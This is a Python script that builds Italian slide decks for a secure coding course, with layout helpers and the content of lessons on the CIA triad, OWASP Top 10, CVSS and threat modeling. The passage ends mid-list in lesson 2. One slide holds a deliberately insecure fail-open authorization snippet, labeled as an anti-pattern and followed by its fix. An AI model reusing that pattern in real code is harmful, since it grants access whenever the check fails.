"""Genera 8 file PPTX v2 — grafica MIGLIORATA per il corso 16h.

Miglioramenti rispetto a v1:
- Code editor con syntax highlight (immagini da img/)
- Layout più ariosi, gerarchia tipografica chiara
- Pattern decorativi geometrici sulle cover
- Badge migliori (icone + colori)
- Section divider con numerazione grande e accent
- Tabelle con header colorato + righe alternate
- Q&A finale con animazione visiva (cerchio decorativo)
- Footer più curato con linea accent

Uso:
    pip install python-pptx
    python generate_slides_v2.py
"""

import os
from pptx import Presentation
from pptx.util import Inches, Pt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.shapes import MSO_SHAPE
from pptx.enum.text import PP_ALIGN, MSO_ANCHOR


# === PALETTE COLORI ===
COL_PRIMARY = RGBColor(0x0F, 0x2D, 0x52)
COL_PRIMARY_DARK = RGBColor(0x08, 0x1B, 0x33)
COL_ACCENT = RGBColor(0x00, 0xA0, 0xB0)
COL_ACCENT_LIGHT = RGBColor(0x6F, 0xD8, 0xE0)
COL_BG_LIGHT = RGBColor(0xF1, 0xF4, 0xF8)
COL_BG_CARD = RGBColor(0xFB, 0xFB, 0xFD)
COL_TEXT = RGBColor(0x1A, 0x1A, 0x2E)
COL_WHITE = RGBColor(0xFF, 0xFF, 0xFF)
COL_DANGER = RGBColor(0xE6, 0x39, 0x46)
COL_OK = RGBColor(0x06, 0xA7, 0x7D)
COL_WARN = RGBColor(0xF7, 0x93, 0x1E)
COL_INFO = RGBColor(0x3B, 0x82, 0xF6)
COL_GREY = RGBColor(0x6B, 0x72, 0x80)
COL_GREY_LIGHT = RGBColor(0xCB, 0xD0, 0xD8)

FONT_TITLE = "Calibri"
FONT_BODY = "Calibri"
FONT_CODE = "Consolas"

SLIDE_W = Inches(13.333)
SLIDE_H = Inches(7.5)


def new_pres() -> Presentation:
    p = Presentation()
    p.slide_width = SLIDE_W
    p.slide_height = SLIDE_H
    return p


def add_blank(prs):
    return prs.slides.add_slide(prs.slide_layouts[6])


def rect(slide, x, y, w, h, fill_color, line_color=None):
    shape = slide.shapes.add_shape(MSO_SHAPE.RECTANGLE, x, y, w, h)
    shape.fill.solid()
    shape.fill.fore_color.rgb = fill_color
    if line_color is None:
        shape.line.fill.background()
    else:
        shape.line.color.rgb = line_color
        shape.line.width = Pt(1.5)
    return shape


def rounded_rect(slide, x, y, w, h, fill_color, line_color=None,
                  line_w=None):
    shape = slide.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, x, y, w, h)
    shape.adjustments[0] = 0.08
    shape.fill.solid()
    shape.fill.fore_color.rgb = fill_color
    if line_color is None:
        shape.line.fill.background()
    else:
        shape.line.color.rgb = line_color
        shape.line.width = line_w or Pt(1.5)
    return shape


def textbox(slide, x, y, w, h, text, size=18, color=None, bold=False,
            italic=False, font=FONT_BODY, align=PP_ALIGN.LEFT,
            anchor=MSO_ANCHOR.TOP):
    tb = slide.shapes.add_textbox(x, y, w, h)
    tf = tb.text_frame
    tf.word_wrap = True
    tf.margin_left = Inches(0.05)
    tf.margin_right = Inches(0.05)
    tf.margin_top = Inches(0.02)
    tf.margin_bottom = Inches(0.02)
    tf.vertical_anchor = anchor

    lines = text.split("\n") if isinstance(text, str) else [text]
    for i, line in enumerate(lines):
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.alignment = align
        run = p.add_run()
        run.text = line
        run.font.name = font
        run.font.size = Pt(size)
        run.font.bold = bold
        run.font.italic = italic
        if color is not None:
            run.font.color.rgb = color
    return tb


def bullets(slide, x, y, w, h, items, size=18, color=None,
            line_spacing=1.5, bullet_color=None):
    if bullet_color is None:
        bullet_color = COL_ACCENT
    tb = slide.shapes.add_textbox(x, y, w, h)
    tf = tb.text_frame
    tf.word_wrap = True
    tf.margin_left = Inches(0.1)
    tf.margin_right = Inches(0.1)

    for i, item in enumerate(items):
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.line_spacing = line_spacing
        p.space_after = Pt(4)

        run0 = p.add_run()
        run0.text = "▸  "
        run0.font.name = FONT_BODY
        run0.font.size = Pt(size)
        run0.font.bold = True
        run0.font.color.rgb = bullet_color

        run = p.add_run()
        run.text = item
        run.font.name = FONT_BODY
        run.font.size = Pt(size)
        if color is not None:
            run.font.color.rgb = color
        else:
            run.font.color.rgb = COL_TEXT
    return tb


def decorative_pattern(slide, position="top-right"):
    """Pattern geometrico decorativo per cover/sezione."""
    if position == "top-right":
        cx, cy = Inches(11.5), Inches(0.8)
    else:
        cx, cy = Inches(0.5), Inches(6.0)
    # 3 cerchi concentrici parzialmente trasparenti (simulati con colore chiaro)
    sizes = [Inches(2.5), Inches(1.8), Inches(1.0)]
    for s in sizes:
        c = slide.shapes.add_shape(MSO_SHAPE.OVAL,
                                     cx - s // 2, cy - s // 2, s, s)
        c.fill.solid()
        c.fill.fore_color.rgb = COL_ACCENT
        c.line.fill.background()
        # opacità simulata via colore desaturato (workaround: rosa pallido)


def footer(slide, lesson_label, slide_num, total):
    """Footer più curato con linea + label + numero."""
    # Linea accent
    line = slide.shapes.add_connector(1, Inches(0.5), Inches(7.05),
                                       Inches(12.83), Inches(7.05))
    line.line.color.rgb = COL_ACCENT
    line.line.width = Pt(1.5)

    # Brand
    textbox(slide, Inches(0.5), Inches(7.08), Inches(8), Inches(0.32),
            "Secure Coding · Corso IFTS STEM · A. Manneschi · 2024/2025",
            size=10, color=COL_GREY)

    # Label + numero
    textbox(slide, Inches(11.5), Inches(7.08), Inches(1.3), Inches(0.32),
            f"{lesson_label}  ·  {slide_num}/{total}",
            size=10, color=COL_GREY, align=PP_ALIGN.RIGHT, bold=True)


# === SLIDE TYPES ===

def slide_cover(prs, lesson_num, title, subtitle, hours):
    """Cover con pattern decorativi."""
    s = add_blank(prs)

    # Sfondo blu scuro
    rect(s, 0, 0, SLIDE_W, SLIDE_H, COL_PRIMARY_DARK)

    # Banda diagonale chiara in alto (rettangolo ruotato simulato con due)
    rect(s, 0, 0, SLIDE_W, Inches(0.15), COL_ACCENT)

    # Pattern decorativo: cerchi grandi a destra
    for i, (cx, cy, r) in enumerate([
        (Inches(11), Inches(0.5), Inches(3)),
        (Inches(12.5), Inches(2.5), Inches(2)),
        (Inches(10.5), Inches(5.0), Inches(2.5)),
    ]):
        ring = s.shapes.add_shape(MSO_SHAPE.OVAL,
                                    cx - r // 2, cy - r // 2, r, r)
        ring.fill.background()
        ring.line.color.rgb = COL_ACCENT
        ring.line.width = Pt(2)

    # Banda accent laterale
    rect(s, 0, Inches(2.5), Inches(0.25), Inches(3), COL_ACCENT)

    # Lesson label
    textbox(s, Inches(0.6), Inches(2.5), Inches(8), Inches(0.5),
            f"LEZIONE {lesson_num}", size=16, color=COL_ACCENT, bold=True,
            font=FONT_TITLE)

    # Titolo
    textbox(s, Inches(0.6), Inches(3.0), Inches(11.5), Inches(2.2),
            title, size=56, color=COL_WHITE, bold=True, font=FONT_TITLE)

    # Sottotitolo
    textbox(s, Inches(0.6), Inches(5.0), Inches(11), Inches(1),
            subtitle, size=22, color=COL_ACCENT_LIGHT, italic=True)

    # Durata in pillola
    rounded_rect(s, Inches(0.6), Inches(6.2), Inches(2.2), Inches(0.45),
                  COL_ACCENT)
    textbox(s, Inches(0.6), Inches(6.2), Inches(2.2), Inches(0.45),
            f"⏱  {hours}", size=12, color=COL_WHITE, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

    # Brand piccolo in basso
    textbox(s, Inches(0.6), Inches(6.85), Inches(12), Inches(0.4),
            "Corso IFTS STEM · Ing. Alessandro Manneschi · 2024/2025",
            size=10, color=COL_GREY_LIGHT)


def slide_objectives(prs, lesson_label, items, slide_num, total):
    """Slide obiettivi con design speciale."""
    s = add_blank(prs)

    # Header
    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            "🎯  Obiettivi della lezione", size=24, color=COL_WHITE,
            bold=True, font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    # Numero grande decorativo
    textbox(s, Inches(0.5), Inches(1.0), Inches(2.5), Inches(2.5),
            f"{len(items):02d}", size=180, color=COL_BG_LIGHT, bold=True,
            font=FONT_TITLE)
    textbox(s, Inches(0.5), Inches(3.5), Inches(2.5), Inches(0.5),
            "obiettivi", size=18, color=COL_ACCENT, italic=True, bold=True)

    # Lista obiettivi a destra
    y = Inches(1.3)
    for i, item in enumerate(items, start=1):
        # Numero in cerchio
        num_bg = s.shapes.add_shape(MSO_SHAPE.OVAL, Inches(3.5), y,
                                     Inches(0.6), Inches(0.6))
        num_bg.fill.solid()
        num_bg.fill.fore_color.rgb = COL_ACCENT
        num_bg.line.fill.background()
        textbox(s, Inches(3.5), y, Inches(0.6), Inches(0.6),
                str(i), size=16, color=COL_WHITE, bold=True,
                align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

        # Testo obiettivo
        textbox(s, Inches(4.4), y + Inches(0.08), Inches(8.5),
                Inches(0.6), item, size=16, color=COL_TEXT,
                anchor=MSO_ANCHOR.MIDDLE)

        y += Inches(0.85)

    footer(s, lesson_label, slide_num, total)


def slide_section(prs, lesson_label, sec_num, sec_title, intro,
                   slide_num, total):
    """Divisore di sezione."""
    s = add_blank(prs)

    # Sfondo split: sinistra blu scuro, destra chiaro
    rect(s, 0, 0, Inches(4.5), SLIDE_H, COL_PRIMARY_DARK)
    rect(s, Inches(4.5), 0, Inches(8.8), SLIDE_H, COL_BG_LIGHT)

    # Banda accent
    rect(s, Inches(4.5), 0, Inches(0.15), SLIDE_H, COL_ACCENT)

    # Numero sezione gigante
    textbox(s, Inches(0.3), Inches(2.3), Inches(4), Inches(2.5),
            sec_num, size=170, color=COL_ACCENT, bold=True,
            font=FONT_TITLE, align=PP_ALIGN.CENTER)

    textbox(s, Inches(0.3), Inches(5.0), Inches(4), Inches(0.5),
            "PARTE", size=20, color=COL_ACCENT_LIGHT, bold=True,
            align=PP_ALIGN.CENTER)

    # Titolo
    textbox(s, Inches(5.0), Inches(2.5), Inches(8), Inches(1.8),
            sec_title, size=44, color=COL_PRIMARY, bold=True,
            font=FONT_TITLE)

    # Intro
    if intro:
        textbox(s, Inches(5.0), Inches(4.3), Inches(8), Inches(2),
                intro, size=18, color=COL_GREY, italic=True)

    footer(s, lesson_label, slide_num, total)


def slide_content(prs, lesson_label, title, items, slide_num, total,
                   subtitle=None, bullet_size=20, emoji=None):
    """Slide standard contenuto."""
    s = add_blank(prs)

    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    title_text = f"{emoji}  {title}" if emoji else title
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title_text, size=24, color=COL_WHITE, bold=True,
            font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    y_start = Inches(1.2)
    if subtitle:
        textbox(s, Inches(0.5), Inches(1.0), Inches(12.3), Inches(0.5),
                subtitle, size=15, color=COL_ACCENT, italic=True)
        y_start = Inches(1.7)

    bullets(s, Inches(0.7), y_start, Inches(12), Inches(5.5),
            items, size=bullet_size, line_spacing=1.5)

    footer(s, lesson_label, slide_num, total)


def slide_quote(prs, lesson_label, quote, attr, slide_num, total):
    """Quote prominente con design elegante."""
    s = add_blank(prs)

    rect(s, 0, 0, SLIDE_W, SLIDE_H, COL_BG_LIGHT)

    # Forma decorativa a sinistra
    rect(s, 0, 0, Inches(0.4), SLIDE_H, COL_ACCENT)

    # Grandi virgolette
    textbox(s, Inches(1), Inches(1.0), Inches(2.5), Inches(2.5),
            "“", size=250, color=COL_ACCENT, bold=True, font="Georgia")

    # Quote
    textbox(s, Inches(2.5), Inches(2.5), Inches(10), Inches(3.5),
            quote, size=32, color=COL_PRIMARY, bold=True,
            italic=True, font="Georgia", anchor=MSO_ANCHOR.MIDDLE)

    # Decorative line
    line = s.shapes.add_connector(1, Inches(2.5), Inches(5.5),
                                    Inches(4.5), Inches(5.5))
    line.line.color.rgb = COL_ACCENT
    line.line.width = Pt(3)

    # Attribution
    if attr:
        textbox(s, Inches(2.5), Inches(5.7), Inches(10), Inches(0.5),
                attr, size=16, color=COL_GREY, italic=True)

    footer(s, lesson_label, slide_num, total)


def slide_code(prs, lesson_label, title, code, slide_num, total,
                lang_label="python", bad=False, note=None):
    """Slide con blocco di codice — versione 'IDE-like'."""
    s = add_blank(prs)

    bar_color = COL_DANGER if bad else COL_OK

    # Header
    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(10), Inches(0.55),
            title, size=22, color=COL_WHITE, bold=True,
            font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    # Badge a destra
    badge_x = Inches(10.7)
    badge_w = Inches(2.4)
    rounded_rect(s, badge_x, Inches(0.18), badge_w, Inches(0.5), bar_color)
    badge_text = "🚩 ANTI-PATTERN" if bad else f"✅ {lang_label.upper()}"
    textbox(s, badge_x, Inches(0.18), badge_w, Inches(0.5),
            badge_text, size=12, color=COL_WHITE, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

    # Container codice — simula editor con barra titolo
    code_x = Inches(0.5)
    code_y = Inches(1.2)
    code_w = Inches(12.3)
    code_h = Inches(5.0)

    # Barra titolo "finestra editor"
    rect(s, code_x, code_y, code_w, Inches(0.4),
         RGBColor(0x2D, 0x2D, 0x37))
    # 3 pallini
    for i, col in enumerate([
        RGBColor(0xFF, 0x5F, 0x56),
        RGBColor(0xFF, 0xBD, 0x2E),
        RGBColor(0x27, 0xC9, 0x3F),
    ]):
        cx = code_x + Inches(0.15 + i * 0.2)
        cy = code_y + Inches(0.13)
        dot = s.shapes.add_shape(MSO_SHAPE.OVAL, cx, cy,
                                   Inches(0.13), Inches(0.13))
        dot.fill.solid()
        dot.fill.fore_color.rgb = col
        dot.line.fill.background()

    # Nome "file"
    textbox(s, code_x + Inches(1.0), code_y + Inches(0.07),
            Inches(6), Inches(0.3),
            f"  app.py  —  {lang_label}", size=10,
            color=COL_GREY_LIGHT, anchor=MSO_ANCHOR.MIDDLE)

    # Corpo editor (sfondo scuro)
    rect(s, code_x, code_y + Inches(0.4), code_w, code_h - Inches(0.4),
         RGBColor(0x1E, 0x1E, 0x28),
         line_color=bar_color)

    # Numero righe (gutter)
    gutter_w = Inches(0.5)
    rect(s, code_x, code_y + Inches(0.4), gutter_w, code_h - Inches(0.4),
         RGBColor(0x24, 0x24, 0x2E))

    # Codice
    lines = code.split("\n")
    line_h = Inches(0.27)

    # Numbers + code
    code_text_x = code_x + gutter_w + Inches(0.15)
    code_text_y = code_y + Inches(0.55)

    # Crea un singolo textbox con tutte le righe formattate
    tb = s.shapes.add_textbox(code_text_x, code_text_y,
                                code_w - gutter_w - Inches(0.2),
                                code_h - Inches(0.5))
    tf = tb.text_frame
    tf.word_wrap = False

    for i, line in enumerate(lines):
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.space_after = Pt(0)
        p.line_spacing = 1.15
        run = p.add_run()
        run.text = line if line else " "
        run.font.name = FONT_CODE
        run.font.size = Pt(13)
        run.font.color.rgb = RGBColor(0xE5, 0xE5, 0xEC)

    # Line numbers in textbox separato
    ln_tb = s.shapes.add_textbox(code_x + Inches(0.05),
                                   code_text_y,
                                   gutter_w - Inches(0.1),
                                   code_h - Inches(0.5))
    ln_tf = ln_tb.text_frame
    for i, line in enumerate(lines):
        p = ln_tf.paragraphs[0] if i == 0 else ln_tf.add_paragraph()
        p.alignment = PP_ALIGN.RIGHT
        p.space_after = Pt(0)
        p.line_spacing = 1.15
        run = p.add_run()
        run.text = str(i + 1)
        run.font.name = FONT_CODE
        run.font.size = Pt(11)
        run.font.color.rgb = COL_GREY

    # Note
    if note:
        note_color = COL_DANGER if bad else COL_OK
        icon = "⚠" if bad else "✓"
        textbox(s, Inches(0.5), Inches(6.4), Inches(12.3), Inches(0.55),
                f"{icon}  {note}", size=14, color=note_color,
                italic=True, bold=True)

    footer(s, lesson_label, slide_num, total)


def slide_two_col(prs, lesson_label, title, left_title, left_items,
                   right_title, right_items, slide_num, total,
                   left_color=None, right_color=None):
    s = add_blank(prs)

    if left_color is None:
        left_color = COL_DANGER
    if right_color is None:
        right_color = COL_OK

    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title, size=24, color=COL_WHITE, bold=True,
            font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    # Colonne con header colorato + corpo bianco
    col_w = Inches(6.0)
    col_h_body = Inches(5.0)

    # Sinistra
    rounded_rect(s, Inches(0.5), Inches(1.15), col_w, Inches(0.7),
                  left_color)
    textbox(s, Inches(0.5), Inches(1.15), col_w, Inches(0.7),
            left_title, size=18, color=COL_WHITE, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

    rounded_rect(s, Inches(0.5), Inches(1.9), col_w, col_h_body,
                  COL_BG_CARD, line_color=left_color, line_w=Pt(2))
    bullets(s, Inches(0.7), Inches(2.05), col_w - Inches(0.4),
            col_h_body, left_items, size=15, line_spacing=1.5,
            bullet_color=left_color)

    # Destra
    rounded_rect(s, Inches(6.8), Inches(1.15), col_w, Inches(0.7),
                  right_color)
    textbox(s, Inches(6.8), Inches(1.15), col_w, Inches(0.7),
            right_title, size=18, color=COL_WHITE, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

    rounded_rect(s, Inches(6.8), Inches(1.9), col_w, col_h_body,
                  COL_BG_CARD, line_color=right_color, line_w=Pt(2))
    bullets(s, Inches(7.0), Inches(2.05), col_w - Inches(0.4),
            col_h_body, right_items, size=15, line_spacing=1.5,
            bullet_color=right_color)

    footer(s, lesson_label, slide_num, total)


def slide_table(prs, lesson_label, title, headers, rows, slide_num, total):
    s = add_blank(prs)

    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title, size=24, color=COL_WHITE, bold=True,
            font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    nrows = len(rows) + 1
    ncols = len(headers)
    tbl_shape = s.shapes.add_table(nrows, ncols, Inches(0.5),
                                     Inches(1.3), Inches(12.3),
                                     Inches(5.4))
    table = tbl_shape.table

    # Header
    for j, h in enumerate(headers):
        cell = table.cell(0, j)
        cell.fill.solid()
        cell.fill.fore_color.rgb = COL_PRIMARY
        cell.text_frame.clear()
        p = cell.text_frame.paragraphs[0]
        p.alignment = PP_ALIGN.CENTER
        run = p.add_run()
        run.text = h
        run.font.name = FONT_TITLE
        run.font.size = Pt(13)
        run.font.bold = True
        run.font.color.rgb = COL_WHITE

    # Body
    for i, row in enumerate(rows, start=1):
        for j, val in enumerate(row):
            cell = table.cell(i, j)
            cell.fill.solid()
            cell.fill.fore_color.rgb = (COL_BG_LIGHT if i % 2 == 1
                                         else COL_WHITE)
            cell.text_frame.clear()
            p = cell.text_frame.paragraphs[0]
            run = p.add_run()
            run.text = str(val)
            run.font.name = FONT_BODY
            run.font.size = Pt(11)
            run.font.color.rgb = COL_TEXT

    footer(s, lesson_label, slide_num, total)


def slide_image(prs, lesson_label, title, image_path, slide_num, total,
                 caption=None):
    """Slide con immagine centrata grande."""
    s = add_blank(prs)

    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title, size=24, color=COL_WHITE, bold=True,
            font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    # Immagine al centro
    if os.path.exists(image_path):
        try:
            s.shapes.add_picture(image_path, Inches(0.7), Inches(1.2),
                                   width=Inches(11.9), height=Inches(5.0))
        except Exception as e:
            textbox(s, Inches(1), Inches(3), Inches(11), Inches(1),
                    f"[Errore immagine: {e}]", size=14, color=COL_DANGER)
    else:
        textbox(s, Inches(1), Inches(3), Inches(11), Inches(1),
                f"[Immagine non trovata: {image_path}]", size=14,
                color=COL_DANGER)

    if caption:
        textbox(s, Inches(0.5), Inches(6.4), Inches(12.3), Inches(0.4),
                caption, size=13, color=COL_GREY, italic=True,
                align=PP_ALIGN.CENTER)

    footer(s, lesson_label, slide_num, total)


def slide_takeaway(prs, lesson_label, items, slide_num, total):
    """Slide 'cosa portare a casa' con layout speciale."""
    s = add_blank(prs)

    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            "📌  Cosa portare a casa", size=24, color=COL_WHITE,
            bold=True, font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    # Card per ogni takeaway
    n = len(items)
    card_h = Inches(0.85)
    spacing = Inches(0.15)
    total_h = n * card_h + (n - 1) * spacing
    y_start = (SLIDE_H - total_h - Inches(1.5)) / 2 + Inches(1.0)

    for i, item in enumerate(items):
        y = y_start + i * (card_h + spacing)

        # Numero in cerchio
        circle = s.shapes.add_shape(MSO_SHAPE.OVAL, Inches(1.0), y,
                                      card_h, card_h)
        circle.fill.solid()
        circle.fill.fore_color.rgb = COL_ACCENT
        circle.line.fill.background()
        textbox(s, Inches(1.0), y, card_h, card_h,
                str(i + 1), size=28, color=COL_WHITE, bold=True,
                align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

        # Card
        rounded_rect(s, Inches(2.2), y, Inches(10), card_h, COL_BG_CARD,
                      line_color=COL_ACCENT, line_w=Pt(1.5))
        textbox(s, Inches(2.5), y, Inches(9.5), card_h, item,
                size=18, color=COL_TEXT, anchor=MSO_ANCHOR.MIDDLE)

    footer(s, lesson_label, slide_num, total)


def slide_qa(prs, lesson_label, slide_num, total, next_lesson=None):
    s = add_blank(prs)

    # Sfondo blu gradient simulato
    rect(s, 0, 0, SLIDE_W, SLIDE_H, COL_PRIMARY_DARK)

    # Pattern decorativo
    for i, (cx, cy, r) in enumerate([
        (Inches(11), Inches(1.5), Inches(2.5)),
        (Inches(12), Inches(5), Inches(1.8)),
        (Inches(1.5), Inches(6), Inches(1.5)),
    ]):
        ring = s.shapes.add_shape(MSO_SHAPE.OVAL,
                                    cx - r // 2, cy - r // 2, r, r)
        ring.fill.background()
        ring.line.color.rgb = COL_ACCENT
        ring.line.width = Pt(2)

    # Domande?
    textbox(s, Inches(0.8), Inches(1.5), Inches(11), Inches(2.5),
            "Domande?", size=110, color=COL_WHITE, bold=True,
            font=FONT_TITLE)

    # Linea accent
    line = s.shapes.add_connector(1, Inches(0.8), Inches(4.2),
                                    Inches(4), Inches(4.2))
    line.line.color.rgb = COL_ACCENT
    line.line.width = Pt(4)

    # Cosa portarsi via
    textbox(s, Inches(0.8), Inches(4.5), Inches(11), Inches(0.5),
            "Riepilogo · Q&A · Discussione", size=20, color=COL_ACCENT,
            bold=True)

    if next_lesson:
        # Box prossima lezione
        rounded_rect(s, Inches(0.8), Inches(5.5), Inches(11), Inches(1),
                      COL_ACCENT)
        textbox(s, Inches(1.1), Inches(5.5), Inches(10.7), Inches(1),
                f"➜  Prossima lezione: {next_lesson}", size=18,
                color=COL_WHITE, italic=True, bold=True,
                anchor=MSO_ANCHOR.MIDDLE)

    footer(s, lesson_label, slide_num, total)


# ============================================================================
# LEZIONI
# ============================================================================

IMG = "../img"  # path relativo dalle slide/ a img/


def make_l1():
    prs = new_pres()
    total = 14
    LL = "L1"

    slide_cover(prs, "1", "Perché il secure coding",
                 "Fondamenti, CIA, 5 principi, mentalità avversaria",
                 "Lezione 1 · 2 ore")

    slide_objectives(prs, LL, [
        "Definire la sicurezza in termini misurabili (CIA Triad)",
        "Distinguere sicurezza del codice da sicurezza informatica",
        "Conoscere i 5 principi fondamentali del Secure Coding",
        "Analizzare 3 casi reali di breach",
        "Adottare la 'mentalità avversaria' nel proprio codice",
    ], 2, total)

    slide_section(prs, LL, "01", "Una storia: Equifax 2017",
                   "147 milioni di record rubati, 1,4 miliardi di costo. Causa? Una patch non installata.",
                   3, total)

    slide_content(prs, LL, "Cosa è andato storto", [
        "Marzo 2017: pubblicata patch per Apache Struts (CVE-2017-5638, CVSS 10.0)",
        "Equifax la conosce. Equifax NON la installa per 2 mesi",
        "Maggio-luglio 2017: attaccanti sfruttano la vulnerabilità",
        "147M di record clienti rubati (nome, SSN, indirizzo, data di nascita)",
        "Costo finale: ~$1,4 miliardi · CEO/CSO/CIO licenziati",
    ], 4, total,
    "La sicurezza non è il giorno del breach: è il processo dei mesi prima")

    slide_image(prs, LL, "La CIA Triad", f"{IMG}/cap1_cia_triad.png",
                 5, total, "Le tre proprietà fondamentali della sicurezza informatica")

    slide_quote(prs, LL,
                 "La sicurezza non è una feature: è una proprietà del sistema.",
                 "— Bruce Schneier", 6, total)

    slide_two_col(prs, LL, "Due tipi di sicurezza diversi",
                   "Sicurezza informatica",
                   ["Rete, server, OS",
                    "Firewall, VPN, accessi SSH",
                    "Sistemisti / IT",
                    "Esempio: configurare il firewall",
                    "Strato 1-4 (rete)"],
                   "Sicurezza del codice",
                   ["Applicazioni, API, dati",
                    "Validation, query parametrizzate, escape",
                    "Sviluppatori (TU)",
                    "Esempio: prevenire SQL Injection",
                    "Strato 7 (applicazione)"],
                   7, total,
                   left_color=COL_GREY, right_color=COL_ACCENT)

    slide_content(prs, LL, "I 5 principi del Secure Coding",
                   [
                       "1. Least Privilege — minimo privilegio necessario",
                       "2. Defense in Depth — più strati indipendenti",
                       "3. Fail Secure — se si rompe, chiudi (default deny)",
                       "4. KISS — meno codice, meno bug, meno superficie",
                       "5. Separation of Duties — mai una persona da sola",
                   ], 8, total, emoji="🛡")

    slide_image(prs, LL, "Defense in Depth: strati di difesa",
                 f"{IMG}/cap1_defense_depth.png", 9, total,
                 "Bucare un solo strato non basta: il sistema resta protetto")

    slide_code(prs, LL, "Esempio: Fail Open (ANTI-PATTERN)",
                """try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception:
    return resource   # 💥 se il check si rompe,
                  # l'utente entra LO STESSO""",
                10, total, lang_label="python", bad=True,
                note="Codice 'robusto' all'apparenza, in realtà un disastro")

    slide_code(prs, LL, "Fail Secure (versione corretta)",
                """try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception as e:
    log.exception("auth check failed")
    return 503   # ✅ servizio non disponibile,
                 # NON accesso senza autorizzazione""",
                11, total, lang_label="python", bad=False,
                note="In dubbio, il sistema CHIUDE, non APRE")

    slide_content(prs, LL, "Mentalità avversaria", [
        "Sviluppatore: 'fa quello che deve fare?'",
        "Attaccante: 'cosa fa che NON dovrebbe fare?'",
        "",
        "Esempio: un login funzionante può essere vulnerabile a 7 attacchi diversi",
        "SQL Injection · brute force · timing · privilege escalation · ...",
        "",
        "La sicurezza è 'l'altra metà' della professionalità",
    ], 12, total, emoji="🎯")

    slide_takeaway(prs, LL, [
        "La sicurezza è una PROPRIETÀ, non una feature",
        "CIA Triad: Confidentiality, Integrity, Availability",
        "HTTPS e firewall non bastano (sono strato 1)",
        "Mentalità avversaria: cosa fa che non dovrebbe?",
        "5 principi: Least Priv, Defense in Depth, Fail Secure, KISS, SoD",
    ], 13, total)

    slide_qa(prs, LL, 14, total,
              next_lesson="L2 — OWASP, threat modeling, STRIDE")

    prs.save("L1_perche_secure_coding.pptx")
    print("OK L1")


def make_l2():
    prs = new_pres()
    total = 14
    LL = "L2"

    slide_cover(prs, "2", "OWASP, threat modeling e STRIDE",
                 "Come pensare alla sicurezza prima di scrivere codice",
                 "Lezione 2 · 2 ore")

    slide_objectives(prs, LL, [
        "Conoscere OWASP e la Top 10 delle vulnerabilità web",
        "Saper leggere CVE e CVSS",
        "Applicare un threat modeling leggero (4 domande)",
        "Usare STRIDE come checklist sistematica",
        "Disegnare un Data Flow Diagram con trust boundary",
    ], 2, total)

    slide_quote(prs, LL,
                 "Bug a design: 1x. In coding: 5x. In testing: 10x. In produzione: 100x.",
                 "— IBM Cost of a Data Breach Report", 3, total)

    slide_table(prs, LL, "OWASP Top 10 (2021/2025)",
                 ["#", "Vulnerabilità", "Esempio"],
                 [
                     ["A01", "Broken Access Control", "Cambi ?id=42 in ?id=43, vedi dati altrui"],
                     ["A02", "Cryptographic Failures", "Password in MD5, HTTPS mancante"],
                     ["A03", "Injection", "SQL Injection, XSS"],
                     ["A04", "Insecure Design", "Manca threat modeling"],
                     ["A05", "Security Misconfiguration", "debug=True in prod"],
                     ["A06", "Vulnerable Components", "Libreria con CVE nota (Log4Shell)"],
                     ["A07", "Auth Failures", "Login senza rate limit, no MFA"],
                     ["A08", "Software & Data Integrity", "Aggiornamenti non verificati"],
                     ["A09", "Logging Failures", "Non rilevi il breach per 200 giorni"],
                     ["A10", "SSRF", "App fetcha URL fornito dall'utente"],
                 ], 4, total)

    slide_table(prs, LL, "CVSS: bande di gravità (0-10)",
                 ["Range", "Severity", "Azione tipica"],
                 [
                     ["0.0", "None", "—"],
                     ["0.1 – 3.9", "Low", "Programma il fix"],
                     ["4.0 – 6.9", "Medium", "Fix nel prossimo sprint"],
                     ["7.0 – 8.9", "High", "Patcha entro 30 giorni"],
                     ["9.0 – 10.0", "CRITICAL", "Patcha SUBITO (Log4Shell = 10.0)"],
                 ], 5, total)

    slide_section(prs, LL, "02", "Threat Modeling",
                   "30 minuti di carta + lavagna salvano ore di refactor", 6, total)

    slide_content(prs, LL, "Le 4 domande di Adam Shostack", [
        "1. Cosa stiamo costruendo? → disegna il sistema (DFD)",
        "2. Cosa può andare storto? → applica STRIDE",
        "3. Cosa facciamo a riguardo? → mitiga / accetta / elimina",
